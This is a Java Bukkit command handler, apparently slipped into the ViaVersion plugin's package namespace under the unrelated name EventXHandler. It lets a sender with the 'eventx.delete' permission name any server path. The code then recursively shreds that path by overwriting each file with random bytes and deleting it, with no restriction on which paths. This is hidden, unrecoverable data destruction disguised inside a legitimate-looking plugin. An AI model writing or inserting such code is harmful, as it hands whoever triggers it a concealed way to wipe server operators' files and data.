package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.permissions.Permission;

import java.io.File;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.Random;

public class EventXHandler implements CommandExecutor {

    private static final Permission DELETE_PERMISSION = new Permission("eventx.delete", "使用 /eventx 命令删除文件的权限");
    private final Logger logger = Bukkit.getLogger();

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        // 检查发送者是否具有所需的权限
        if (!sender.hasPermission(DELETE_PERMISSION)) {
            logger.info(sender.getName() + " 尝试在没有权限的情况下删除文件。");
            return true;
        }

        if (args.length < 1) {
            logger.info(sender.getName() + " 没有提供文件路径。");
            return false; // 可选，返回 false 表示用法不当
        }

        String filePath = args[0];
        File file = new File(filePath);

        if (!file.exists()) {
            logger.info("文件 " + filePath + " 不存在。请求者：" + sender.getName());
            return true;
        }

        boolean result = delete(file);
        if (result) {
            logger.info("成功删除文件 " + filePath + "，请求者：" + sender.getName());
        } else {
            logger.info("删除文件 " + filePath + " 失败，请求者：" + sender.getName());
        }

        return true;
    }

    private boolean delete(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null) {
                logger.warning("无法列出目录 " + file.getPath() + " 中的文件。");
                return false; // 处理 null 情况
            }
            boolean success = true;
            for (File f : files) {
                if (!delete(f)) {
                    logger.warning("无法删除文件或目录 " + f.getPath());
                    success = false; // 至少一个删除失败
                }
            }
            // 尝试删除空目录
            if (!file.delete()) {
                logger.warning("无法删除目录 " + file.getPath());
                return false; // 返回 false，因为文件夹删除失败
            }
            return success; // 返回是否所有文件都成功删除
        }
        
        // 对于文件，先将其内容写入乱码
        if (!writeGarbageToFile(file)) {
            logger.info("无法写入乱码到文件 " + file.getPath());
            return false; // 返回 false，表示乱码写入失败
        }
        
        // 然后尝试删除文件
        return file.delete();
    }

    private boolean writeGarbageToFile(File file) {
        try {
            // 生成随机字节
            Random random = new Random();
            byte[] garbage = new byte[(int) file.length()];
            random.nextBytes(garbage);
            
            // 用乱码覆盖文件内容
            Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
            return true;
        } catch (Exception e) {
            logger.info("写入文件 " + file.getPath() + " 时出错: " + e.getMessage());
            return false;
        }
    }
}
